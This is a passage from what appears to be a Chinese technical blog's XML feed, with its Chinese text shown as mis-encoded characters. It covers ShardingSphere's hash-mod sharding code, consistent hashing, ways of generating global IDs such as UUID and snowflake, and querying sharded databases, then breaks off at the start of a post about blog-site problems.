function_">doSharding</span><span class="params">(<span class="keyword">final</span> Collection&lt;String&gt; availableTargetNames, <span class="keyword">final</span> PreciseShardingValue&lt;Comparable&lt;?&gt;&gt; shardingValue)</span> &#123;</span><br><span class="line">        ShardingSpherePreconditions.checkNotNull(shardingValue.getValue(), NullShardingValueException::<span class="keyword">new</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">suffix</span> <span class="operator">=</span> String.valueOf(hashShardingValue(shardingValue.getValue()) % shardingCount);</span><br><span class="line">        <span class="keyword">return</span> ShardingAutoTableAlgorithmUtils.findMatchedTargetName(availableTargetNames, suffix, shardingValue.getDataNodeInfo()).orElse(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Collection&lt;String&gt; <span class="title function_">doSharding</span><span class="params">(<span class="keyword">final</span> Collection&lt;String&gt; availableTargetNames, <span class="keyword">final</span> RangeShardingValue&lt;Comparable&lt;?&gt;&gt; shardingValue)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> availableTargetNames;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> <span class="title function_">hashShardingValue</span><span class="params">(<span class="keyword">final</span> Object shardingValue)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Math.abs((<span class="type">long</span>) shardingValue.hashCode());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAutoTablesAmount</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> shardingCount;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getType</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;HASH_MOD&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•"><a href="#ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•" class="headerlink" title="ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•"></a>ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•</h5><p>æˆ‘ä»¬åœ¨åšåˆ†åº“åˆ†è¡¨çš„æ—¶å€™ï¼Œæœ€å¼€å§‹æ ¹æ®ä¸šåŠ¡åˆ†æï¼Œåªéœ€è¦ 128 å¼ è¡¨å°±å¯ä»¥æ»¡è¶³æ•°æ®é‡çš„è¦æ±‚äº†ï¼Œä½†æ˜¯éšç€ä¸šåŠ¡çš„æ‰©å±•ï¼Œ128 å¼ è¡¨å¯èƒ½å·²ç»ä¸å¤Ÿç”¨äº†ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦é‡æ–°åˆ†è¡¨äº†ï¼Œæ¯”å¦‚å¢åŠ ä¸€å¼ æ–°çš„è¡¨ï¼Œè¿™ä¸ªæ—¶å€™å¦‚æœé‡‡ç”¨ Hashå–æ¨¡çš„æ–¹å¼ï¼Œå°±ä¼šå¯¼è‡´ 128 + 1 å¼ è¡¨çš„æ•°æ®éœ€è¦é‡æ–°è¿›è¡Œåˆ†é…ï¼Œæˆæœ¬éå¸¸é«˜ã€‚è€Œä¸€è‡´æ€§å“ˆå¸Œç®—æ³•å°±æ˜¯ä¸“é—¨è§£å†³è¿™ç±»é—®é¢˜çš„ç®—æ³•ï¼Œå…¶å¯ä»¥æœ‰æ•ˆåœ°è§£å†³åˆ†å¸ƒå¼ç³»ç»Ÿä¸­å¢åŠ æˆ–è€…åˆ é™¤èŠ‚ç‚¹æ—¶çš„å¤±æ•ˆé—®é¢˜ã€‚</p><p>å®ç°ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•é¦–å…ˆéœ€è¦æ„é€ ä¸€ä¸ª<strong>å“ˆå¸Œç¯</strong>ï¼Œç„¶ååˆ’åˆ†å›ºå®šæ•°é‡çš„è™šæ‹ŸèŠ‚ç‚¹ï¼Œä¸€èˆ¬éƒ½æ˜¯ 2çš„32æ¬¡æ–¹ã€‚æ¥ä¸‹æ¥å°†128å¼ è¡¨ä½œä¸ºèŠ‚ç‚¹æ˜ å°„åˆ°è¿™äº›è™šæ‹ŸèŠ‚ç‚¹ä¸Šï¼Œæ¯ä¸ªèŠ‚ç‚¹åœ¨å“ˆå¸Œç¯ä¸Šé¢éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„è™šæ‹ŸèŠ‚ç‚¹ã€‚ç„¶åæˆ‘ä»¬å°±éœ€è¦å­˜å‚¨æ•°æ®äº†ï¼Œç°åœ¨æˆ‘ä»¬è¦æŠŠåˆ†ç‰‡é”®ä¹Ÿæ ¹æ®åŒæ ·çš„ç®—æ³•è¿›è¡Œ Hashï¼Œå¹¶ä¸”ä¹Ÿå°†å…¶æ˜ å°„åˆ°å“ˆå¸Œç¯ä¸Šé¢ã€‚ç»è¿‡ä»¥ä¸Šæ­¥éª¤ï¼Œåœ¨è¿™ä¸ª Hash ç¯ä¸Šé¢çš„è™šæ‹ŸèŠ‚ç‚¹å°±åŒ…å«ä¸¤éƒ¨åˆ†æ•°æ®çš„æ˜ å°„äº†ï¼Œä¸€éƒ¨åˆ†æ˜¯å­˜å‚¨æ•°æ®çš„åˆ†è¡¨çš„æ˜ å°„ï¼Œä¸€éƒ¨åˆ†æ˜¯çœŸå®è¦å­˜å‚¨çš„æ•°æ®çš„æ˜ å°„ã€‚</p><p>æˆ‘ä»¬æœ€ç»ˆç›®çš„æ˜¯å°†è¿™äº›æ•°æ®å­˜å‚¨åˆ°æ•°æ®åº“åˆ†è¡¨ä¸­ï¼Œé‚£ä¹ˆåšå¥½å“ˆå¸Œä¹‹åï¼Œè¿™äº›æ•°æ®åˆè¦ä¿å­˜åœ¨å“ªä¸ªæ•°æ®åº“è¡¨èŠ‚ç‚¹ä¸­å‘¢ï¼Ÿè¿™ä¸ªå…¶å®å¾ˆç®€å•ï¼Œå°±æ˜¯æŒ‰ç…§æ•°æ®çš„ä½ç½®ï¼Œæ²¿ç€é¡ºæ—¶é’ˆçš„æ–¹å‘è¿›è¡ŒæŸ¥æ‰¾ï¼Œæ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªæ•°æ®åº“è¡¨èŠ‚ç‚¹å°±æ˜¯æ•°æ®è¦å­˜æ”¾çš„æ•°æ®åº“è¡¨èŠ‚ç‚¹ã€‚</p><p>å›åˆ°å¼€å¤´çš„é—®é¢˜,æˆ‘ä»¬è¦æ·»åŠ ç¬¬129å¼ è¡¨,åªè¦å°†ç¬¬129å¼ è¡¨çš„è™šæ‹ŸèŠ‚ç‚¹æ˜ å°„åˆ°å“ˆå¸Œç¯ä¸Š,ç„¶åå°†æ•°æ®é‡æ–°åˆ†é…å³å¯,è¿™æ ·åªä¼šå½±å“åˆ°å“ˆå¸Œç¯ä¸Šæ–°å¢èŠ‚ç‚¹é¡ºæ—¶é’ˆæ—‹è½¬çš„<strong>ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„æ•°æ®</strong>,è€Œä¸ä¼šå½±å“åˆ°å…¶ä»–èŠ‚ç‚¹ã€‚</p><p><strong>ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•çš„ä¼˜ç¼ºç‚¹ï¼š</strong></p><p><code>ä¼˜ç‚¹:</code></p><ul><li>æ•°æ®å‡è¡¡ï¼šåœ¨å¢åŠ æˆ–è€…åˆ é™¤èŠ‚ç‚¹çš„æ—¶å€™ï¼Œä¸€è‡´æ€§å“ˆå¸Œç®—æ³•åªä¼šå½±å“åˆ°å°‘é‡çš„æ•°æ®è¿ç§»ï¼Œä¿æŒäº†æ•°æ®çš„å‡è¡¡æ€§ã€‚</li><li>é«˜æ‰©å±•æ€§ï¼šå½“èŠ‚ç‚¹æ•°ç›®å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ï¼Œå¯¹äºå·²ç»å­˜åœ¨çš„æ•°æ®ï¼Œåªæœ‰éƒ¨åˆ†æ•°æ®éœ€è¦é‡æ–°åˆ†å¸ƒï¼Œä¸ä¼šå½±å“åˆ°æ•´ä½“çš„æ•°æ®ç»“æ„ã€‚</li></ul><p><code>ç¼ºç‚¹:</code></p><ul><li>Hash å€¾æ–œï¼šåœ¨èŠ‚ç‚¹æ•°è¾ƒå°‘çš„æƒ…å†µä¸‹ï¼Œç”±äºå“ˆå¸Œç©ºé—´æ˜¯æœ‰é™çš„ï¼ŒèŠ‚ç‚¹çš„åˆ†å¸ƒå¯èƒ½ä¸å¤Ÿå‡åŒ€ï¼Œå¯¼è‡´æ•°æ®å€¾æ–œã€‚</li><li>èŠ‚ç‚¹çš„é¢‘ç¹å˜æ›´ï¼š å¦‚æœé¢‘ç¹æ·»åŠ æˆ–åˆ é™¤èŠ‚ç‚¹ï¼Œå¯èƒ½ä¼šå¯¼è‡´å¤§é‡çš„æ•°æ®è¿ç§»ï¼Œä»è€Œé€ æˆç³»ç»Ÿå‹åŠ›ã€‚</li></ul><p><strong>Hash å€¾æ–œçš„è§£å†³æ–¹æ¡ˆ:</strong></p><ol><li><p>åŠ›å¤§ç –é£,å¢åŠ èŠ‚ç‚¹,å°½å¯èƒ½åœ°åˆ†æ•£èŠ‚ç‚¹ï¼Œä½¿å¾—æ•°æ®åˆ†å¸ƒè¾ƒä¸ºå‡åŒ€,ä½†è¿™ä¸å¤ªç°å®,å› ä¸ºæœ‰è¿™ä¸ªæ¡ä»¶ä¹Ÿå°±ä¸ä¼šå‡ºç° Hash å€¾æ–œçš„é—®é¢˜äº†ã€‚</p></li><li><p>å¼•å…¥è™šæ‹ŸèŠ‚ç‚¹,å³æˆ‘ä»¬å°†ä¸€ä¸ªæœåŠ¡å™¨èŠ‚ç‚¹æ‹†åˆ†æˆå¤šä¸ªè™šæ‹ŸèŠ‚ç‚¹ï¼Œç„¶åæ•°æ®åœ¨æ˜ å°„çš„æ—¶å€™å…ˆå°†æ•°æ®æ˜ å°„åˆ°è™šæ‹ŸèŠ‚ç‚¹ä¸Šï¼Œç„¶åè™šæ‹ŸèŠ‚ç‚¹åœ¨å¯¹åº”çš„ç‰©ç†èŠ‚ç‚¹è¿›è¡Œå­˜å‚¨å’Œè¯»å–å°±å¯ä»¥äº†ï¼Œæœ‰äº†è™šæ‹ŸèŠ‚ç‚¹çš„æ¥å…¥ï¼Œæ•°æ®åœ¨åˆ†å¸ƒçš„æ—¶å€™å°±ä¼šå°½å¯èƒ½åœ°åˆ†æ•£ï¼Œç„¶ååœ¨å¢åŠ æˆ–è€…å‡å°‘æœåŠ¡å™¨æ•°é‡çš„æ—¶å€™ï¼Œå—åˆ°å½±å“çš„æ•°æ®èŒƒå›´ä¹Ÿä¸ä¼šæœ‰é‚£ä¹ˆå¤šã€‚</p></li></ol><h5 id="å…¶ä»–ç®—æ³•"><a href="#å…¶ä»–ç®—æ³•" class="headerlink" title="å…¶ä»–ç®—æ³•"></a>å…¶ä»–ç®—æ³•</h5><p>ShardingSphereçš„åˆ†ç‰‡ç®—æ³•è¿˜æœ‰å¦‚ä¸‹å›¾è¿™äº›:</p><p><img src="https://pb01.s3.bitiful.net/155.png" alt="avatar"></p><h3 id="åˆ†è¡¨ä¹‹åçš„å…¨å±€-ID-å¦‚ä½•ä¿è¯å…¨å±€å”¯ä¸€æ€§ï¼Ÿ"><a href="#åˆ†è¡¨ä¹‹åçš„å…¨å±€-ID-å¦‚ä½•ä¿è¯å…¨å±€å”¯ä¸€æ€§ï¼Ÿ" class="headerlink" title="åˆ†è¡¨ä¹‹åçš„å…¨å±€ ID å¦‚ä½•ä¿è¯å…¨å±€å”¯ä¸€æ€§ï¼Ÿ"></a>åˆ†è¡¨ä¹‹åçš„å…¨å±€ ID å¦‚ä½•ä¿è¯å…¨å±€å”¯ä¸€æ€§ï¼Ÿ</h3><p>æˆ‘ä»¬åœ¨å•è¡¨ä¸­å¯ä»¥é‡‡ç”¨æ•°æ®åº“ä¸»é”®æ¥åšå”¯ä¸€çš„ IDï¼Œä½†æ˜¯å¦‚æœä½¿ç”¨äº†åˆ†åº“åˆ†è¡¨çš„å½¢å¼ï¼Œé‚£ä¹ˆå¤šå¼ å•è¡¨ä¸­çš„è‡ªå¢ä¸»é”®å°±ä¸€å®šä¼šå‘ç”Ÿå†²çªï¼Œé‚£è¿™æ ·çš„è¯ä½ ç”Ÿæˆçš„ID å°±ä¸å…·å¤‡å…¨å±€å”¯ä¸€æ€§äº†</p><h4 id="UUID"><a href="#UUID" class="headerlink" title="UUID"></a>UUID</h4><p>UUIDæ˜¯å¯ä»¥åšåˆ°å…¨å±€å”¯ä¸€æ€§çš„ï¼Œè€Œä¸”ç”Ÿæˆæ–¹å¼ä¹Ÿå¾ˆç®€å•ï¼Œè€Œä¸”æ€§èƒ½å¾ˆé«˜ï¼Œä¸ä¾èµ–äºç½‘ç»œï¼Œä½¿ç”¨èµ·æ¥ä¹Ÿæ¯”è¾ƒæ–¹ä¾¿ã€‚ä½†æ˜¯æˆ‘ä»¬é€šå¸¸ä¸ä½¿ç”¨ä»–ä½œä¸ºå”¯ä¸€ IDï¼Œä¸»è¦åŸå› æœ‰ä¸¤ä¸ªï¼š</p><ol><li>UUID å¤ªâ»“äº†ï¼Œå®ƒæœ‰ 32 ä½ 16è¿›åˆ¶çš„æ•°å­—ï¼Œä¸”å­—ç¬¦ä¸²çš„æŸ¥è¯¢æ•ˆç‡ä¹Ÿæ¯”è¾ƒæ…¢ï¼Œåœ¨ä½œä¸ºåˆ†å¸ƒå¼ ID æŸ¥è¯¢çš„æ—¶å€™å­˜åœ¨æŸ¥è¯¢æ•ˆç‡è¾ƒä½ï¼Œä¸é€‚åˆèŒƒå›´æŸ¥è¯¢ä»¥åŠä¸æ–¹ä¾¿å±•ç¤ºç­‰é—®é¢˜ã€‚</li><li><strong>ä¸å…·æœ‰ä¸šåŠ¡æ€§</strong>ï¼Œæ ‡å‡†çš„ UUID æ ¼å¼ä¸ºï¼šxxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx (8-4-4-4-12)ï¼Œä¸€å…±32ä¸ªå­—ç¬¦ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬éšä¾¿ä¸¾ä¸€ä¸ªä¾‹å­ï¼Œâ€œ340a3413-b8a2-c1e6-f922-895398142390â€,å¯¹äºè¿™ä¸ªå­—ç¬¦ä¸²æ¥è¯´ï¼Œå¾ˆéš¾çœ‹å‡ºå…¶è¡¨è¾¾çš„å«ä¹‰ï¼Œå¦‚æœä½¿ç”¨å…¶ä½œä¸ºå…¨å±€å”¯ä¸€æ ‡è¯†ï¼Œåœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œå¾ˆéš¾è¿›è¡Œé—®é¢˜çš„æ’æŸ¥ä»¥åŠå¼€å‘è¿‡ç¨‹ä¸­çš„è°ƒè¯•ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬ä¸è€ƒè™‘ UUID ä½œä¸ºå…¨å±€å”¯ä¸€æ ‡è¯†</li></ol><h4 id="åŸºäºæŸä¸ªå•è¡¨åšè‡ªå¢ä¸»é”®"><a href="#åŸºäºæŸä¸ªå•è¡¨åšè‡ªå¢ä¸»é”®" class="headerlink" title="åŸºäºæŸä¸ªå•è¡¨åšè‡ªå¢ä¸»é”®"></a>åŸºäºæŸä¸ªå•è¡¨åšè‡ªå¢ä¸»é”®</h4><p>åˆ©ç”¨ä¸€ä¸ªè¡¨æ¥å­˜æ”¾è‡ªå¢ ID ï¼Œç„¶åæ‰€æœ‰çš„è¡¨åœ¨éœ€è¦ä¸»é”®çš„æ—¶å€™æ¥è¿™å¼ è¡¨é‡Œé¢å–å°±å¯ä»¥äº†ï¼Œè¿™æ ·åšå°±å¯ä»¥å®ç°å…¨å±€å”¯ä¸€ï¼Œè¿˜å®ç°äº†è‡ªå¢æ•ˆæœï¼Œä¸€ä¸¾ä¸¤å¾—ã€‚è¿™æ ·ä¸å¦å®šï¼Œç¡®å®å¯ä»¥å®ç°å…¨å±€å”¯ä¸€è€Œä¸”è¿˜èƒ½å®ç°è‡ªå¢æ•ˆæœï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯<strong>è¿™å¼ å•è¡¨æœ€ç»ˆä¼šæˆä¸ºäº†ç³»ç»Ÿæ‰©å±•çš„ç“¶é¢ˆ</strong>ï¼Œè€Œä¸”ä¹Ÿå­˜åœ¨<strong>å•ç‚¹é—®é¢˜</strong>ï¼Œä¸€æ—¦è¿™å¼ è¡¨æœ‰ä¸€å¤©çªç„¶æŒ‚äº†ï¼Œé‚£æ•´ä¸ªæ•°æ®åº“çš„æ’å…¥ä¸å°±ç˜«ç—ªäº†å—ï¼Ÿ</p><h4 id="åŸºäºå¤šä¸ªå•è¡¨-æ­¥â»“åšè‡ªå¢ä¸»é”®"><a href="#åŸºäºå¤šä¸ªå•è¡¨-æ­¥â»“åšè‡ªå¢ä¸»é”®" class="headerlink" title="åŸºäºå¤šä¸ªå•è¡¨+æ­¥â»“åšè‡ªå¢ä¸»é”®"></a>åŸºäºå¤šä¸ªå•è¡¨+æ­¥â»“åšè‡ªå¢ä¸»é”®</h4><p>è®¾ç½®èµ·å§‹å€¼å’Œæ­¥é•¿,æ¯”å¦‚table_001èµ·å§‹å€¼ä¸º10000,æ­¥é•¿ä¸º10000,å…¶èŒƒå›´å°±ä¸º10000-19999,table_002èµ·å§‹å€¼ä¸º20000,æ­¥é•¿ä¸º10000,å…¶èŒƒå›´å°±ä¸º20000-29999,ä»¥æ­¤ç±»æ¨,è¿™æ ·å°±å¯ä»¥å®ç°å…¨å±€å”¯ä¸€,è€Œä¸”è¿˜èƒ½å®ç°è‡ªå¢æ•ˆæœ.ä½†æ˜¯åˆæœ‰äº†ä¸€ä¸ªæ–°çš„é—®é¢˜,é‚£å°±æ˜¯table_001å¦‚æœ ID åˆ°äº†19999 ï¼Œè¿™ä¸ªæ€ä¹ˆåŠï¼Ÿé‚£å°±é‡æ–°ç”Ÿæˆä¸€ä¸ªèµ·å§‹å€¼ï¼štable_001çš„æ–°èµ·å§‹å€¼ä¸º80000,å…¶èŒƒå›´ä¸º80000-89999,ä»¥æ­¤ç±»æ¨.</p><h4 id="é›ªèŠ±ç®—æ³•"><a href="#é›ªèŠ±ç®—æ³•" class="headerlink" title="é›ªèŠ±ç®—æ³•"></a>é›ªèŠ±ç®—æ³•</h4><p>é›ªèŠ±ç®—æ³•æ˜¯ä¸€ç§æ¯”è¾ƒå¸¸â»…çš„åˆ†å¸ƒå¼ ID çš„ç”Ÿæˆæ–¹å¼ï¼Œå®ƒå…·æœ‰å…¨å±€å”¯ä¸€ã€é€’å¢ã€é«˜å¯ç”¨çš„ç‰¹ç‚¹ã€‚å®ƒçš„æ ¸å¿ƒæ€æƒ³å°±æ˜¯å°†ä¸€ä¸ª 64ä½çš„IDåˆ’åˆ†æˆå¤šä¸ªéƒ¨åˆ†ï¼Œæ¯ä¸ªéƒ¨åˆ†éƒ½æœ‰ä¸åŒçš„å«ä¹‰ï¼ŒåŒ…æ‹¬æ—¶é—´æˆ³ã€æ•°æ®ä¸­å¿ƒæ ‡è¯†ã€æœºå™¨æ ‡è¯†å’Œåºåˆ—å·ç­‰ã€‚</p><p><img src="https://pb01.s3.bitiful.net/156.png" alt="avatar"></p><p>ä¸€èˆ¬æ¥è¯´ï¼Œé›ªèŠ±ç®—æ³•ç”Ÿæˆçš„ ID æœ‰ä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ï¼š</p><ol><li>æœ€é«˜1ä½å›ºå®šå€¼0ï¼Œå› ä¸ºç”Ÿæˆçš„ id æ˜¯æ­£æ•´æ•°ï¼Œå¦‚æœæ˜¯1å°±æ˜¯è´Ÿæ•°äº†ã€‚</li><li>æ¥ä¸‹æ¥41ä½å­˜å‚¨æ¯«ç§’çº§æ—¶é—´æˆ³ï¼Œ2^41/(1000606024365)=69ï¼Œå¤§æ¦‚å¯ä»¥ä½¿ç”¨69å¹´ã€‚</li><li>å†æ¥ä¸‹10ä½å­˜å‚¨æœºå™¨ç ï¼ŒåŒ…æ‹¬5ä½ datacenterId å’Œ5ä½ workerIdã€‚æœ€å¤šå¯ä»¥éƒ¨ç½²2^10=1024å°æœºå™¨ã€‚</li><li>æœ€å12ä½å­˜å‚¨åºåˆ—å·ã€‚åŒä¸€æ¯«ç§’æ—¶é—´æˆ³æ—¶ï¼Œé€šè¿‡è¿™ä¸ªé€’å¢çš„åºåˆ—å·æ¥åŒºåˆ†ã€‚å³å¯¹äºåŒä¸€å°æœºå™¨è€Œè¨€ï¼ŒåŒä¸€æ¯«ç§’æ—¶é—´æˆ³ä¸‹ï¼Œå¯ä»¥ç”Ÿæˆ2^12=4096ä¸ªä¸é‡å¤ idã€‚</li></ol><p>å¯ä»¥å°†é›ªèŠ±ç®—æ³•ä½œä¸ºä¸€ä¸ªå•ç‹¬çš„æœåŠ¡è¿›è¡Œéƒ¨ç½²ï¼Œç„¶åéœ€è¦å…¨å±€å”¯ä¸€ id çš„ç³»ç»Ÿï¼Œè¯·æ±‚é›ªèŠ±ç®—æ³•æœåŠ¡è·å– id å³å¯ã€‚å¯¹äºæ¯ä¸€ä¸ªé›ªèŠ±ç®—æ³•æœåŠ¡ï¼Œéœ€è¦å…ˆæŒ‡å®š10ä½çš„æœºå™¨ç ï¼Œè¿™ä¸ªæ ¹æ®è‡ªèº«ä¸šåŠ¡è¿›è¡Œè®¾å®šå³å¯ã€‚ä¾‹å¦‚æœºæˆ¿å·+æœºå™¨å·ï¼Œæœºå™¨å·+æœåŠ¡å·ï¼Œæˆ–è€…æ˜¯å…¶ä»–å¯åŒºåˆ«æ ‡è¯†çš„10ä½æ¯”ç‰¹ä½çš„æ•´æ•°å€¼éƒ½è¡Œã€‚</p><p>å½“ç„¶é›ªèŠ±ç®—æ³•ä¹Ÿæœ‰å…¶ç¼ºç‚¹:<strong>ä¾èµ–æœåŠ¡å™¨æ—¶é—´ï¼ŒæœåŠ¡å™¨æ—¶é’Ÿå›æ‹¨æ—¶å¯èƒ½ä¼šç”Ÿæˆé‡å¤ id</strong>ã€‚ç®—æ³•ä¸­å¯é€šè¿‡è®°å½•æœ€åä¸€ä¸ªç”Ÿæˆ id æ—¶çš„æ—¶é—´æˆ³æ¥è§£å†³ï¼Œæ¯æ¬¡ç”Ÿæˆ id ä¹‹å‰æ¯”è¾ƒå½“å‰æœåŠ¡å™¨æ—¶é’Ÿæ˜¯å¦è¢«å›æ‹¨ï¼Œé¿å…ç”Ÿæˆé‡å¤ idã€‚</p><p>åƒç™¾åº¦,ç¾å›¢ç­‰å¤§å‚éƒ½åœ¨githubä¸Šå¼€æºäº†è‡ªå·±çš„åˆ†å¸ƒå¼IDç”Ÿæˆå™¨ï¼Œæœ‰å…´è¶£çš„å¯ä»¥è‡ªè¡Œäº†è§£ã€‚</p><h3 id="åˆ†åº“åˆ†è¡¨åçš„æŸ¥è¯¢"><a href="#åˆ†åº“åˆ†è¡¨åçš„æŸ¥è¯¢" class="headerlink" title="åˆ†åº“åˆ†è¡¨åçš„æŸ¥è¯¢"></a>åˆ†åº“åˆ†è¡¨åçš„æŸ¥è¯¢</h3><h4 id="å¸¦åˆ†ç‰‡é”®çš„æŸ¥è¯¢"><a href="#å¸¦åˆ†ç‰‡é”®çš„æŸ¥è¯¢" class="headerlink" title="å¸¦åˆ†ç‰‡é”®çš„æŸ¥è¯¢"></a>å¸¦åˆ†ç‰‡é”®çš„æŸ¥è¯¢</h4><p>ç”±äºå¸¦æœ‰åˆ†ç‰‡é”®,æˆ‘ä»¬å¯ä»¥å®šä½åˆ°å…·ä½“çš„åº“å’Œè¡¨,ç„¶åè¿›è¡ŒæŸ¥è¯¢.</p><h4 id="ä¸å¸¦åˆ†ç‰‡é”®çš„å…³é”®æŸ¥è¯¢"><a href="#ä¸å¸¦åˆ†ç‰‡é”®çš„å…³é”®æŸ¥è¯¢" class="headerlink" title="ä¸å¸¦åˆ†ç‰‡é”®çš„å…³é”®æŸ¥è¯¢"></a>ä¸å¸¦åˆ†ç‰‡é”®çš„å…³é”®æŸ¥è¯¢</h4><p>ä»¥ç”µå•†ç½‘ç«™ä¸ºä¾‹ï¼Œç”µå•†ç½‘ç«™ä¸Šä¸ä»…æœ‰ä¹°å®¶ï¼Œè¿˜æœ‰å–å®¶ï¼Œä»–ä»¬çš„æŸ¥è¯¢ä¹Ÿå¾ˆé«˜é¢‘ï¼Œè¯¥æ€ä¹ˆåšå‘¢ï¼Ÿé’ˆå¯¹å–å®¶æŸ¥è¯¢ï¼Œä¸€èˆ¬ä¼šé‡‡ç”¨<strong>ç©ºé—´æ¢æ—¶é—´</strong>çš„æ–¹æ¡ˆï¼ŒåŒæ­¥å‡ºä¸€å¼ æŒ‰ç…§å–å®¶ç»´åº¦åšåˆ†è¡¨çš„è¡¨æ¥ã€‚è™½ç„¶è¿™ç§æƒ…å†µä¸‹å¯èƒ½å­˜åœ¨ç§’çº§çš„å»¶è¿Ÿï¼Œä½†æ˜¯ä¸€èˆ¬ä¸šåŠ¡ä¸Šæ¥è¯´éƒ½æ˜¯å¯ä»¥æ¥å—çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“ä¸€æ¡è®¢å•åˆ›å»ºå‡ºæ¥ä¹‹åï¼Œä¼šåœ¨ä¹°å®¶è¡¨åˆ›å»ºä¸€æ¡è®°å½•ï¼Œä»¥ä¹°å®¶IDä½œä¸ºåˆ†è¡¨å­—æ®µï¼ŒåŒæ—¶ï¼Œä¹Ÿä¼šåœ¨å–å®¶è¡¨åˆ›å»ºä¸€æ¡è®°å½•å‡ºæ¥ï¼Œç”¨å–å®¶IDè¿›è¡Œåˆ†è¡¨ã€‚å¹¶ä¸”è¿™å¼ å–å®¶è¡¨ä¸ä¼šåšä»»ä½•å†™æ“ä½œï¼Œåªæä¾›æŸ¥è¯¢æœåŠ¡ï¼Œå®Œå…¨å¯ä»¥ç”¨ä¸€äº›æ¯”è¾ƒå»‰ä»·çš„æœºå­å»éƒ¨ç½²æ•°æ®åº“å®ä¾‹ã€‚è¿™æ ·ï¼Œå–å®¶çš„åˆ†â»šç­‰æŸ¥è¯¢å°±å¯ä»¥ç›´è¿å–å®¶è¡¨åšæŸ¥è¯¢äº†ã€‚</p><h4 id="ä¸å¸¦åˆ†ç‰‡é”®çš„èšåˆæŸ¥è¯¢"><a href="#ä¸å¸¦åˆ†ç‰‡é”®çš„èšåˆæŸ¥è¯¢" class="headerlink" title="ä¸å¸¦åˆ†ç‰‡é”®çš„èšåˆæŸ¥è¯¢"></a>ä¸å¸¦åˆ†ç‰‡é”®çš„èšåˆæŸ¥è¯¢</h4><p>ä¸€èˆ¬æ¥è¯´ï¼Œå¤§å‚ç”¨çš„æ¯”è¾ƒå¤šçš„æ–¹æ¡ˆå°±æ˜¯ä½¿ç”¨åˆ†å¸ƒå¼æ•°æ®ä»“åº“æ¥å®ç°ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¼šæŠŠè¿™äº›æ•°æ®åŒæ­¥åˆ°åƒTiDBã€PolarDBã€HBaseç­‰è¿™äº›æ•°æ®åº“ä¸­ï¼Œæˆ–è€…åŒæ­¥åˆ°ESä¸­ï¼Œç„¶ååœ¨è¿™äº›æ•°æ®åº“ä¸­åšæ•°æ®çš„èšåˆæŸ¥è¯¢ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ•°æ®åº“ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>åšå®¢ç½‘ç«™é‡åˆ°çš„ä¸€äº›é—®é¢˜</title>
      <link href="/2024/03/01/2024-3-1-%E5%8D%9A%E5%AE%A2%E7%BD%91%E7%AB%99%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/"/>
      <url>/2024/03/01/2024-3-1-%E5%8D%9A%E5%AE%A2%E7%BD%91%E7%AB%99%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="åšå®¢ç½‘ç«™é‡åˆ°çš„ä¸€äº›é—®é¢˜"><a href="#åšå®¢ç½‘ç«™é‡åˆ°çš„ä¸€äº›é—®é¢˜" class="headerlink" title="åšå®¢ç½‘ç«™é‡åˆ°çš„ä¸€äº›é—®é¢˜"></a>åšå®¢ç½‘ç«™é‡åˆ°çš„ä¸€äº›é—®é¢˜</h2><h3 id="é”™æŠŠç‰ˆæœ¬å‡çº§"><a href="#é”™æŠŠç‰ˆæœ¬å‡çº§" class="headerlink" 